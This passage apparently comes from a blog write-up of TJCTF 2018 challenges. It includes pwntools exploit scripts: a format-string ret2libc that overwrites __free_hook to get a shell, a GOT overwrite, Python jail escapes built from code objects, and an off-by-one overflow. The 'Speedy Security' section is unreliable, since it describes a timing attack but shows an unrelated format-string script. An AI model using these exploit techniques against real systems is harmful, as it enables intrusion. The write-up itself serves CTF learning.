+  0xB9, 0x4D, 0x3C, 0xA3, 0x0B, 0xB2, 0x2B, 0xAB, 0x46, 0x7E, 0x24, 0x9C, 0x85, 0x6F, 0xE4, 0xC4,
+  0x5F, 0xCE, 0x4F, 0x01, 0x82, 0xFD, 0x6C, 0xAC, 0xDF, 0x64, 0x0C, 0xA1, 0xE3, 0x9E, 0x5D, 0xBB,
+  0xFE, 0xD3, 0x29, 0x96, 0xC7, 0xF3, 0xFC, 0x65, 0xAA, 0x8A, 0x5A, 0xF5, 0xB7, 0x38, 0xA5, 0x8D,
+  0xD8, 0x8E, 0x39, 0x07, 0xDE, 0xD5, 0x11, 0x80, 0xE5, 0x89, 0x35, 0xFF, 0xDD, 0xA6, 0x1F, 0x23,
+  0x0D, 0xC0, 0x93, 0xC8, 0x67, 0x17, 0x68, 0x18, 0x8B, 0x62, 0xCC, 0x9D, 0xDA, 0x56, 0x66, 0xC6,
+  0x7F, 0xE6, 0x86, 0xE0, 0x22, 0xC2, 0x0F, 0x1B, 0xF6, 0x2D, 0x63, 0x33, 0x91, 0x71, 0x59, 0xEB,
+  0xA9, 0xD2, 0x83, 0xBF, 0x3D, 0x6A, 0x08, 0xF9, 0xA7, 0x40, 0x00, 0xE8, 0x52, 0xBE, 0xFA, 0x4E,
+  0x26, 0x76, 0xCF, 0x54, 0x7D, 0x19, 0x06, 0xF8, 0xD0, 0x74, 0x28, 0x05, 0x3F, 0xA0, 0x1E, 0xC1,
+  0x45, 0x49, 0xD4, 0xAF, 0x03, 0x9B, 0x2F, 0xEE, 0x27, 0x9A, 0xA4, 0x97, 0x48, 0x4A, 0xD9, 0x37,
+  0x47, 0xAD, 0x44, 0xCA, 0xEF, 0xD7, 0xB8, 0xDB, 0xF0, 0x9F, 0x58, 0x53, 0xEA, 0x2A, 0x7A, 0x36,
+  0x87, 0x8C, 0xB5, 0x72, 0x88, 0xB1, 0x09, 0xF1, 0x16, 0x3E, 0x69, 0x14, 0xEC, 0x25, 0xBC, 0xED,
+  0xBA, 0xBD, 0x2C, 0xC9, 0xDC, 0x13, 0xF4, 0x75, 0x1D, 0x4B, 0xC3, 0x34, 0x10, 0x6B, 0x77, 0x98,
+  0x5E, 0x5C, 0x99, 0x8F, 0x12, 0x94, 0xCB, 0x2E, 0x4C, 0xE9, 0x20, 0xF7, 0x43, 0x60, 0xFB, 0x6D,
+  0x1C, 0x78, 0x0E, 0xB0, 0xD6, 0x50, 0x79, 0x7B, 0x61, 0x95, 0xA8, 0x04, 0x5B, 0xF2, 0x90, 0x21
+]
+
+message = ''
+
+input_size = len(message)
+counter = 0
+
+while counter &lt; input_size:
+    input_size_1_counter = input_size - 1 - counter # index ref
+
+    ebx = u[counter]
+    eax = v[message[input_size_1_counter]]
+
+    message[input_size_1_counter] = xor(eax, ebx)
+
+    counter += 1
+
+print message
+</code></pre>
+
+<p>As you can see, it is a xor encryption with two byte matrixes:</p>
+
+<ol>
+<li>v matrix transform</li>
+<li>xor with the u matrix</li>
+</ol>
+
+<p>The code below reverses the process:</p>
+
+<pre><code class="language-python">u = [
+  ...
+]
+
+v = [
+  ...
+]
+
+message = [0x22, 0xc1, 0x5d, 0x5f, 0x23, 0x23, 0x8a, 0x8f, 0xff, 0x8d, 0x29, 0x9f, 0x8e, 0x5a, 0x1c, 0x62]
+input_size = len(message)
+for counter in range(input_size):
+  input_size_1_counter = input_size - 1 - counter
+
+  message[input_size_1_counter] = message[input_size_1_counter] ^ u[counter]
+  message[input_size_1_counter] = v.index(message[input_size_1_counter])
+
+
+print(message)
+print(''.join([ hex(x)[2:] for x in message ]))
+</code></pre>
+
+<p>Flag: <code>yummy_h45h_br0wn</code></p>
+
+<h1 id="interference-miscellaneous">Interference - Miscellaneous</h1>
+
+<h2 id="problem-7">Problem</h2>
+
+<p>Written by jfrucht25</p>
+
+<p>I was looking at some images but I couldn&rsquo;t see them clearly. I think there&rsquo;s some <a href="/blog/tjctf-2018-writeup/Interference/interference.zip">interference</a>.</p>
+
+<h2 id="solution-7">Solution</h2>
+
+<p>The zip file contains two png images with the same dimension.</p>
+
+
+<figure>
+    
+        <img src="/blog/tjctf-2018-writeup/Interference/v1.png" alt="v1.png" />
+    
+    
+    <figcaption>
+        <p>
+        v1.png
+        
+            
+        
+        </p> 
+    </figcaption>
+    
+</figure>
+
+
+
+<figure>
+    
+        <img src="/blog/tjctf-2018-writeup/Interference/v2.png" alt="v2.png" />
+    
+    
+    <figcaption>
+        <p>
+        v2.png
+        
+            
+        
+        </p> 
+    </figcaption>
+    
+</figure>
+
+
+<p>By comparing each pixel using imagemagick, we get a new image which is a QR code:</p>
+
+<pre><code>&gt; compare v1.png v2.png diff.png
+</code></pre>
+
+
+<figure>
+    
+        <img src="/blog/tjctf-2018-writeup/Interference/diff.png" alt="diff.png" />
+    
+    
+    <figcaption>
+        <p>
+        diff.png
+        
+            
+        
+        </p> 
+    </figcaption>
+    
+</figure>
+
+
+<p>After decoding the QR code, you get the flag.</p>
+
+<p>Flag: <code>tjctf{m1x1ing_and_m4tchIng_1m4g3s_15_fun}</code></p>
+
+<h1 id="mirror-mirror-miscellaneous">Mirror Mirror - Miscellaneous</h1>
+
+<h2 id="problem-8">Problem</h2>
+
+<p>Written by Alaska47</p>
+
+<p>If you look closely, you can see a reflection.</p>
+
+<p><code>nc problem1.tjctf.org 8004</code></p>
+
+<h2 id="solution-8">Solution</h2>
+
+<p>This is a python jail escape problem similar to <a href="https://lbarman.ch/blog/pyjail/">this</a>.</p>
+
+<p>By overriding <code>bad</code> and <code>banned</code> in the <code>get_flag</code> function, we can print out the source code of the challenge:</p>
+
+<pre><code class="language-python">&gt;&gt;&gt; dir(get_flag)
+['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
+&gt;&gt;&gt; get_flag.func_globals
+{'PseudoFile': &lt;class '__main__.PseudoFile'&gt;, 'code': &lt;module 'code' from '/usr/lib/python2.7/code.pyc'&gt;, 'bad': ['__class__', '__base__', '__subclasses__', '_module', 'open', 'eval', 'execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file', 'reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], '__builtins__': &lt;module '?' (built-in)&gt;, '__file__': '/home/app/problem.py', 'execfile': &lt;built-in function execfile&gt;, '__package__': None, 'sys': &lt;module 'sys' (built-in)&gt;, 'getattr': &lt;built-in function getattr&gt;, 'Shell': &lt;class __main__.Shell at 0x7f0b20f79c80&gt;, 'banned': ['vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], 'InteractiveConsole': &lt;class code.InteractiveConsole at 0x7f0b20f79c18&gt;, 'eval': &lt;built-in function eval&gt;, 'get_flag': &lt;function get_flag at 0x7f0b20f898c0&gt;, '__name__': '__main__', 'main': &lt;function main at 0x7f0b20f9c410&gt;, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)}
+&gt;&gt;&gt; get_flag.func_globals['bad'] = []
+&gt;&gt;&gt; get_flag.func_globals['banned'] = []
+&gt;&gt;&gt; open('/home/app/problem.py').read()
+...
+</code></pre>
+
+<p><a href="/blog/tjctf-2018-writeup/Mirror Mirror/source.py">source code</a></p>
+
+<p>By running the line that generates the flag locally, we can print out the flag.</p>
+
+<p>Flag: <code>tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}</code></p>
+
+<h1 id="ssleepy-forensics">Ssleepy - forensics</h1>
+
+<h2 id="problem-9">Problem</h2>
+
+<p>Written by Alaska47</p>
+
+<p>I found this super suspicious <a href="/blog/tjctf-2018-writeup/Ssleepy/ssleepy.pcapng">transmission</a> lying around on the floor. What could be in it?</p>
+
+<h2 id="solution-9">Solution</h2>
+
+<p>By inspecting the traffic dump using wireshark, we can see that there are two types of protocals: <code>ftp</code> and <code>https</code>. Because <code>https</code> is encrypted, we start by looking at the <code>ftp</code> traffics:</p>
+
+
+<figure>
+    
+        <img src="/blog/tjctf-2018-writeup/Ssleepy/screen.png" alt="A zip file was transfered" />
+    
+    
+    <figcaption>
+        <p>
+        A zip file was transfered
+        
+            
+        
+        </p> 
+    </figcaption>
+    
+</figure>
+
+
+<p>After extracting the zip file, we obtain a <a href="/blog/tjctf-2018-writeup/Ssleepy/server_key.pem">key file</a>.</p>
+
+<p>Using this key, we can then decrypt the https traffic:</p>
+
+
+<figure>
+    
+        <img src="/blog/tjctf-2018-writeup/Ssleepy/screen2.png" />
+    
+    
+</figure>
+
+
+<p>Extracing an image from the traffic, we are able to get the flag:</p>
+
+
+<figure>
+    
+        <img src="/blog/tjctf-2018-writeup/Ssleepy/flag.jpg" />
+    
+    
+</figure>
+
+
+<h1 id="bad-cipher-reverse-engineering">Bad Cipher - Reverse Engineering</h1>
+
+<h2 id="problem-10">Problem</h2>
+
+<p>Written by nthistle</p>
+
+<p>My friend insisted on using his own cipher program to encrypt this flag, but I don&rsquo;t think it&rsquo;s very secure. Unfortunately, he is quite good at Code Golf, and it seems like he tried to make the program as short (and confusing!) as possible before he sent it.</p>
+
+<p>I don&rsquo;t know the key length, but I do know that the only thing in the plaintext is a flag. Can you break his cipher for me?</p>
+
+<p><a href="/blog/tjctf-2018-writeup/Bad Cipher/bad_cipher.py">Encryption Program</a></p>
+
+<p><a href="/blog/tjctf-2018-writeup/Bad Cipher/flag.enc">Encrypted Flag</a></p>
+
+<h2 id="solution-10">Solution</h2>
+
+<p>I started out by constructing a decryption method. Then I find the key length based on the algorithm (8 bytes in this case). Because the message is the flag, the first six characters must be <code>tjctf{</code> which gives us the first six bytes of the key. With only 2 bytes unknown, we can just brute force the flag:</p>
+
+<pre><code class="language-python">import string
+
+message = &quot;[REDACTED][REDACTED][REDACTED]abcdefg&quot;
+key = &quot;abcde&quot;
+
+
+def e(message, key):
+  l = len(key)
+  s = [message[i::l] for i in range(l)]
+  print s
+  for i in range(l):
+    a = 0
+    e = ''
+    for c in s[i]:
+      a = ord(c) ^ ord(key[i]) ^ (a &gt;&gt; 2)
+      e += chr(a)
+    s[i] = e
+
+  # print s
+  # print(zip(*s))
+  # print &quot;&quot;.join(&quot;&quot;.join(y) for y in zip(*s))
+  return &quot;&quot;.join(hex((1 &lt;&lt; 8)+ord(f))[3:] for f in &quot;&quot;.join(&quot;&quot;.join(y) for y in zip(*s)))
+
+def crack(message):
+  startText = 'tjctf{'
+  possibleKeyLength = [1, 2, 4, 7, 8, 14, 28, 56]
+
+  for l in possibleKeyLength:
+    key = ''
+    chars = [ chr(int(message[x:x+2], 16)) for x in range(0, len(message), 2) ]
+    splitCipher = lambda A, n: [tuple(A[i:i+n]) for i in range(0, len(A), n)]
+    chars = splitCipher(chars, l)
+    chars = zip(*chars)
+    for i in range(min(len(startText), len(chars))):
+      key += chr(ord(chars[i][0]) ^ ord(startText[i]))
+    print key
+    
+def d(message, key):
+  l = len(key)
+  chars = [ chr(int(message[x:x+2], 16)) for x in range(0, len(message), 2) ]
+  splitCipher = lambda A, n: [tuple(A[i:i+n]) for i in range(0, len(A), n)]
+  chars = splitCipher(chars, l)
+  chars = zip(*chars)
+  # print chars
+  for i in range(l):
+    a = 0
+    e = ''
+    for charI in range(len(chars[i])):
+      if a == 0:
+        a = ord(chars[i][charI]) ^ ord(key[i]) ^ (a &gt;&gt; 2)
+      else:
+        a = ord(chars[i][charI]) ^ ord(key[i]) ^ (ord(chars[i][charI-1]) &gt;&gt; 2)
+      e += chr(a)
+    chars[i] = e
+
+  final = ''
+  for a in range(len(chars[0])):
+    for b in range(len(chars)):
+      final += chars[b][a]
+  return final
+
+c = e(message, key)
+print c
+print d(c, key)
+print crack('473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554')
+print d('473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554', '3V@mK&lt;aa')
+
+# got keyLength = 8
+
+for a in string.printable:
+  for b in string.printable:
+    flag = d('473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554', '3V@mK&lt;'+a+b)
+    if flag[-1] == '}':
+      print flag
+</code></pre>
+
+<p>Flag: <code>tjctf{m4ybe_Wr1t3ing_mY_3ncRypT10N_MY5elf_W4Snt_v_sm4R7}</code></p>
+
+<h1 id="request-me-web">Request Me - Web</h1>
+
+<h2 id="problem-11">Problem</h2>
+
+<p>Written by okulkarni</p>
+
+<p><a href="https://request_me.tjctf.org/">https://request_me.tjctf.org/</a></p>
+
+<h2 id="solution-11">Solution</h2>
+
+<p>This question is about http methods.</p>
+
+<pre><code class="language-python">from requests.auth import HTTPBasicAuth
+import requests
+
+print requests.options('https://request_me.tjctf.org/').text
+
+print requests.put('https://request_me.tjctf.org/', data = {'username':'abcde', 'password':'abcde'}).text
+
+print requests.post('https://request_me.tjctf.org/', auth=HTTPBasicAuth('abcde', 'abcde')).text
+
+print requests.delete('https://request_me.tjctf.org/', auth=HTTPBasicAuth('abcde', 'abcde')).text
+</code></pre>
+
+<pre><code>❯ python main.py
+GET, POST, PUT, DELETE, OPTIONS
+Parameters: username, password
+Some methods require HTTP Basic Auth
+I stole your credentials!
+Maybe you should take your credentials back?
+Finally! The flag is tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}
+</code></pre>
+
+<p>Flag: <code>tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}</code></p>
+
+<h1 id="python-reversing-reverse-engineering">Python Reversing - Reverse Engineering</h1>
+
+<h2 id="problem-12">Problem</h2>
+
+<p>Written by jfrucht25</p>
+
+<p>Found this flag checking file and it is quite vulnerable</p>
+
+<p><a href="/blog/tjctf-2018-writeup/Python Reversing/source.py">Source</a></p>
+
+<h2 id="solution-12">Solution</h2>
+
+<pre><code class="language-python">
+from itertools import *
+import numpy as np
+
+def decode(message):
+  lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]
+  for l in combinations([x for x in range(19, 25)], 0):
+    counter = 19
+    index = 0
+    arr = [304, 189, 161, 133, 7, 169, 291, 382, 143, 341, 1, 131, 366, 23, 427, 370, 134, 428, 161]
+    isGood = True
+    while counter &lt; 25:
+      if counter in l:
+        if message[index:index+9][0] == '0':
+          isGood = False
+        arr.append(int(message[index:index+9], 2))
+        index += 9
+      else:
+        arr.append(int(message[index:index+8], 2))
+        index += 8
+      counter += 1
+    # if not isGood:
+    #   break
+    # print l
+    print(arr)
+    arr = [j^lmao[i] for i , j in enumerate(arr)]
+    # print(arr)
+    np.random.seed(12345)
+    arr = np.array(arr)
+    other = np.random.randint(1,5,(len(arr)))
+    arr = np.divide(arr, other).tolist()
+    print ''.join([chr(x) for x in arr])
+
+  # splitCipher = lambda A, n: [A[i:i+n] for i in range(0, len(A), n)]
+  # chars = splitCipher(message, 8)
+  # print chars
+
+decode('100010001010101001100001110110100110011101')
+</code></pre>
+
+<p>Flag: <code>tjctf{pYth0n_1s_tr1v14l}</code></p>
+
+<h1 id="tilted-troop-binary-exploitation">Tilted Troop - Binary Exploitation</h1>
+
+<h2 id="problem-13">Problem</h2>
+
+<p>Written by dwiz24</p>
+
+<p>Can you help us defeat the monster? <a href="/blog/tjctf-2018-writeup/Tilted Troop/strover">binary</a> (<a href="/blog/tjctf-2018-writeup/Tilted Troop/strover.c">source</a>)</p>
+
+<h2 id="solution-13">Solution</h2>
+
+<p>The problem used a mix of <code>&lt;</code>, and <code>&lt;=</code> allowing us to create 9 team although the <code>MAX_TEAM_SIZE</code> is 8, and because <code>strength</code> pointer is directly below <code>names</code> pointers, the last team&rsquo;s name pointer overrides the strength pointer allowing us to have full control over the strength attribute.</p>
+
+<pre><code class="language-c">struct team {
+    char* names[MAX_TEAM_SIZE];
+    char* strength;
+    int teamSize;
+} typedef team;
+</code></pre>
+
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+context.binary = './strover'
+
+# sh = process('./strover')
+sh = remote('problem1.tjctf.org', 8002)
+
+print sh.recvuntil('Quit\n')
+
+payload = 'bbbj'
+
+for i in range(9):
+  sh.sendline('A '+payload)
+sh.sendline('F')
+
+
+sh.interactive()
+</code></pre>
+
+<p>Flag: <code>tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}</code></p>
+
+<h1 id="caesar-s-complication-cryptography">Caesar&rsquo;s Complication - Cryptography</h1>
+
+<h2 id="problem-14">Problem</h2>
+
+<p>Written by evanyeyeye</p>
+
+<p>King Julius Caesar was infamous for his <a href="/blog/tjctf-2018-writeup/Caesar's Complication/puzzle">wordsearch</a> solving speed.</p>
+
+<h2 id="solution-14">Solution</h2>
+
+<p>This question is an interesting combination of <code>wordsearch</code> and the <code>Caesar cipher</code>.</p>
+
+<pre><code class="language-python"># from https://github.com/robbiebarrat/word-search/blob/master/wordsearch.py
+
+solutions = ['tjctf{']
+puzzle = open('./puzzle').read().strip()
+
+s = 'abcdefghijklmnopqrstuvwxyz'
+
+for i in range(len(s)):
+  temp = ''
+  for e in puzzle:
+    if e in '{}\n':
+      temp += e
+    else:
+      temp += s[(s.find(e)+1)%len(s)]
+  puzzle = temp
+  print i
+
+  wordgrid = puzzle.replace(' ','')
+
+  # Computers start counting at zero, so...
+  length = wordgrid.index('\n')+1
+
+  characters = [(letter, divmod(index, length))
+              for  index, letter in enumerate (wordgrid)]
+
+  wordlines = {}
+  # These next lines just  directions so you can tell which direction the word is going
+  directions = {'going downwards':0, 'going downwards and left diagonally':-1, 'going downwards and right diagonally':1}
+
+  for word_direction, directions in directions.items():
+    wordlines[word_direction] = []
+    for x in range(length):
+      for i in range(x, len(characters), length + directions):
+        wordlines[word_direction].append(characters[i])
+      wordlines[word_direction].append('\n')
+
+  # Nice neat way of doing reversed directions.
+  wordlines['going right'] = characters
+  wordlines['going left'] = [i for i in reversed(characters)]
+  wordlines['going upwards'] = [i for i in reversed(wordlines['going downwards'])]
+  wordlines['going upwards and left diagonally'] = [i for i in reversed(wordlines['going downwards and right diagonally'])]
+  wordlines['going upwards and right diagonally'] = [i for i in reversed(wordlines['going downwards and left diagonally'])]
+
+
+  def printitout(direction, tuple, lines):
+    print &quot;Keep in mind, rows are horizontal and columns are vertical.\n&quot;
+    for direction, tuple in lines.items():
+      string = ''.join([i[0] for i in tuple])
+      for word in solutions:
+        if word in string:
+          coordinates = tuple[string.index(word)][1]
+          print word, 'is at row', coordinates[0]+1, 'and column', coordinates[1]+1, direction + &quot;.&quot;
+          y = coordinates[0]
+          x = coordinates[1]
+          f = ''
+          while y &gt;= 0 and x &lt; 100:
+            f += puzzle.split('\n')[y][x]
+            x += 1
+            y -= 1
+          print f
+  printitout(word_direction, tuple, wordlines)
+</code></pre>
+
+<p>Flag: <code>tjctf{idesofmarch}</code></p>
+
+<h1 id="the-abyss-miscellaneous">The Abyss - Miscellaneous</h1>
+
+<h2 id="problem-15">Problem</h2>
+
+<p>Written by nthistle</p>
+
+<p>If you stare into the abyss, the abyss stares back.</p>
+
+<p><code>nc problem1.tjctf.org 8006</code></p>
+
+<h2 id="solution-15">Solution</h2>
+
+<p>This is another python jail problem similiar to <code>Mirror Mirror</code>. The difference is this time there is no existing function, and all the useful functions such as <code>input</code>, <code>open</code> are removed from the <code>builtins</code>.</p>
+
+<p>I was stuck on the problem for a long time until I looked into python <a href="https://stackoverflow.com/questions/5768684/what-is-a-python-code-object">code objects</a>.</p>
+
+<p>Here are a few of the reference articles that helped me along the way:</p>
+
+<ul>
+<li><a href="http://pbiernat.blogspot.com/2014/09/bypassing-python-sandbox-by-abusing.html">Bypassing a python sandbox by abusing code objects</a></li>
+<li><a href="https://rushter.com/blog/python-bytecode-patch/">How to patch Python bytecode</a></li>
+<li><a href="https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/">【VULNERABLITY】python sandbox escape</a></li>
+<li><a href="http://blog.orleven.com/2016/10/27/python-sandbox-excape/">Python Sandbox Excape</a></li>
+</ul>
+
+<p><strong>Step one: helper scripts</strong></p>
+
+<p>I want a fast way of testing my code on the server, so I decided to write a helper script that takes the content of a python file and feed it line by line to the sevrer.</p>
+
+<pre><code class="language-python">from pwn import *
+
+with open('./exploit.py') as e:
+  code = e.read().strip().split('\n')
+
+sh = remote('problem1.tjctf.org', 8006)
+
+for line in code:
+  sh.sendlineafter('&gt;&gt;&gt; ', line)
+sh.interactive()
+</code></pre>
+
+<p><strong>Step two: the exploit</strong></p>
+
+<p>Now, we can work on the accual exploit script. Our goal is to obtain a copy of the <code>file</code> object that allows us to read the flag.</p>
+
+<p>One method is to call <code>().__class__.__base__.__subclasses__()[40]</code>; however, the server prevents us from accessing anything related to <code>__</code>.</p>
+
+<p>This is when python code objects comes in. We will build a function that returns the object:</p>
+
+<pre><code class="language-python">def f():
+  return ().__class__.__base__.__subclasses__()
+</code></pre>
+
+<p>and get all the info about the byte codes of the function:</p>
+
+<pre><code class="language-python">print f.func_code.co_argcount
+print f.func_code.co_nlocals
+print f.func_code.co_stacksize
+print f.func_code.co_flags
+print f.func_code.co_consts
+print f.func_code.co_names
+print f.func_code.co_varnames
+print f.func_code.co_filename
+print f.func_code.co_name
+print f.func_code.co_firstlineno
+print f.func_code.co_lnotab
+print f.func_code.co_freevars
+print f.func_code.co_cellvars
+</code></pre>
+
+<p>Now using <a href="https://raw.githubusercontent.com/d4em0n/nostr/master/obfuscate_str.py">this</a> handy tool, we get a string that contain <code>__</code> which bypasses the string restriction:</p>
+
+<pre><code class="language-python">a=((()&gt;[])+(()&gt;[]));aa=(((a&lt;&lt;a)&lt;&lt;a)*a);u=('c%'[::(({}&gt;[])-(()&gt;[]))])*a%((aa+(((a&lt;&lt;a)*a)+((a&lt;&lt;a)+((a*a)+(a+(()&gt;[])))))),(aa+(((a&lt;&lt;a)*a)+((a&lt;&lt;a)+((a*a)+(a+(()&gt;[])))))))
+</code></pre>
+
+<p>add a few helper varibles, and we are done:</p>
+
+<pre><code class="language-python">builtins_str = globals().keys()[0]
+
+def f(x): print x
+
+f('a')
+code = type(f.func_code)
+function = type(f)
+
+mydict = {}
+mydict[builtins_str] = globals()[builtins_str]
+
+a=((()&gt;[])+(()&gt;[]));aa=(((a&lt;&lt;a)&lt;&lt;a)*a);u=('c%'[::(({}&gt;[])-(()&gt;[]))])*a%((aa+(((a&lt;&lt;a)*a)+((a&lt;&lt;a)+((a*a)+(a+(()&gt;[])))))),(aa+(((a&lt;&lt;a)*a)+((a&lt;&lt;a)+((a*a)+(a+(()&gt;[])))))))
+codeobj = code(0, 0, 1, 67, 'd\x01\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00S', (None, ()), (u+'class'+u, u+'base'+u, u+'subclasses'+u), (), 'noname', '&lt;module&gt;', 1, '', (), ()) 
+
+pwn = function(codeobj, mydict, None, None, None)
+pwn()
+</code></pre>
+
+<p>Flag: <code>tjctf{h3y_n0w_1Ts_d4Rk_d0Wn_H3re}</code></p>
+
+<h1 id="super-secure-secrets-binary-exploitation">Super Secure Secrets - Binary Exploitation</h1>
+
+<h2 id="problem-16">Problem</h2>
+
+<p>Written by evanyeyeye</p>
+
+<p>I humbly present to you &ndash; Super Secure Secrets! Never before has there been a secret storing service so uncrackable. If you so desire, you can download our free trial <a href="/blog/tjctf-2018-writeup/Super Secure Secrets/super_secure">here</a>.</p>
+
+<p>DISCLAIMER: We are in no way affiliated with Secure Secrets. In addition, any rumors you may have heard about our service being illegitimate are false and defamatory.</p>
+
+<h2 id="solution-16">Solution</h2>
+
+<p>This is the sequel to <code>Secure Secrets</code>, and just like the last one, there&rsquo;s a format string vulnerablity.</p>
+
+<p>The difference, however, is that there&rsquo;s not <code>get_secret</code> method this time and we need to get ourself a shell.</p>
+
+<p>Because NX is enabled, shellcode is nearly impossible:</p>
+
+<pre><code>&gt; r2 ./super_secure
+[0x00400880]&gt; i~nx
+nx       true
+</code></pre>
+
+<p>We have to do <code>ret2libc</code> instead.</p>
+
+<p>The exploit consist of three stages:</p>
+
+<ol>
+<li>allow us to print mutliple different messages</li>
+<li>leak the libc base address</li>
+<li>call one_gadget and get shell</li>
+</ol>
+
+<p>Here are a few important steps in the process:</p>
+
+<p><strong>Where to get a shell? - one_gadget</strong></p>
+
+<p>one_gadget is a cool tool that does one thing: find shells in a binary library. There is the output of running the command:</p>
+
+<pre><code>$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0x4f2c5	execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  rcx == NULL
+
+0x4f322	execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c	execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+</code></pre>
+
+<p><strong>How to call the address? - free_hook and malloc</strong></p>
+
+<p>Because <code>printf</code> utilizes <code>malloc</code> and <code>free</code>, we can trigger a <code>free</code> call just by doing <code>'%65537c'</code>.</p>
+
+<p>And we can overwrite <code>__free_hook</code> to listen to <code>free</code> calls, therefore, invoke our own function.</p>
+
+<p>Read <a href="https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function">this</a> for more info.</p>
+
+<p>Full code:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# context.log_level = 'debug'
+context.binary = './super_secure'
+
+sh = process('./super_secure')
+# sh = remote('problem1.tjctf.org', 8009)
+
+
+def send_payload(payload, p=False):
+  sh.sendlineafter('&gt; ', 's')
+  sh.sendlineafter(':\n', '123')
+  sh.sendlineafter(':\n', payload)
+  sh.sendlineafter('&gt; ', 'v')
+  sh.sendlineafter(':\n', '123')
+  if p:
+    sh.recvuntil('====================\n')
+    out = sh.recvuntil('====================\n').split('\n')[0]
+    print out
+  sh.sendline('')
+  if p:
+    return out
+
+memset_got = 0x00602050
+strcmp_got = 0x00602070
+
+secure_service = 0x00400da0
+
+# stage 1: make it loop
+
+stage1 = '%{}x'.format(secure_service)
+stage1 += '%28$n  '
+stage1 += p64(memset_got)
+
+send_payload(stage1)
+
+# stage 2: leak libc
+
+# for i in range(1, 50):
+#   send_payload('%{}$llx'.format(i), True)
+
+output = int(send_payload('%1$llx', True), 16)
+system_c = output - 3789731
+lib_c_base = system_c - 0x0004f440
+pwn_adrr = lib_c_base + 0x10a38c
+free_hook = lib_c_base + 0x001ed8e8 + 0x200000
+
+print hex(lib_c_base)
+print hex(pwn_adrr)
+print hex(free_hook)
+
+pause()
+
+# stage 3: pwn
+goal = hex(pwn_adrr+0x10000000000000000)[3:]
+for i in range(len(goal), 4, -4):
+  stage3 = '%{}x'.format(int(goal[i-4:i], 16))
+  l = len(stage3)
+  stage3 += '%28$n'.ljust(16-l)
+  stage3 += p64(free_hook+(16-i)/2)
+  send_payload(stage3, True)
+
+send_payload('%65537c')
+
+sh.interactive()
+</code></pre>
+
+<p>Flag: <code>tjctf{4r3_f0rm47_57r1n65_63771n6_0ld_y37?}</code></p>
+
+<h1 id="speedy-security-miscellaneous">Speedy Security - Miscellaneous</h1>
+
+<h2 id="problem-17">Problem</h2>
+
+<p>Written by nthistle</p>
+
+<p>I hear there&rsquo;s a flag hiding behind this new service, Speedy Security&trade;. Can you find it?</p>
+
+<p><code>nc problem1.tjctf.org 8003</code></p>
+
+<h2 id="solution-17">Solution</h2>
+
+<pre><code>$ nc problem1.tjctf.org 8003
+Welcome to Speedy Security(TM), where we'll check your password as much as you like, for added security!
+How many times would you like us to check each character of your password?
+100
+Please enter your password:
+abcde
+Authorization failed!
+</code></pre>
+
+<p>Looking at this problem, I quickly realized that it vulnerable to a timing attack.</p>
+
+<p>If you have 2 correct characters, it is going to take longer than if you only have 1 correct character; therefore, we can guess the password one character at a time.</p>
+
+<pre><code class="language-python">from pwn import *
+
+# context.log_level = 'debug'
+context.binary = './secure'
+
+# sh = process('./secure')
+sh = remote('problem1.tjctf.org', 8008)
+
+secret_addr = 0x08048713
+puts_got = 0x0804a028
+
+payload = p32(puts_got)
+payload += p32(puts_got+2)
+payload += '%35$34571x'
+payload += '%35$n'
+payload += '%36$33009x'
+payload += '%36$n'
+payload += '\n'
+
+sh.sendafter('&gt; ', '12345\n')
+sh.sendafter('&gt; ', payload)
+sh.sendafter('&gt; ', '12345\n')
+sh.interactive()
+</code></pre>
+
+<p>Special note:</p>
+
+<blockquote>
+<p>Because the network is super slow, I rented a digitalocean server for about an hour to run the script which makes the whole process 10 times faster</p>
+</blockquote>
+
+<p>Flag: <code>tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}</code></p>
+
+                </section>
+            </article>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'github-blog-14'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
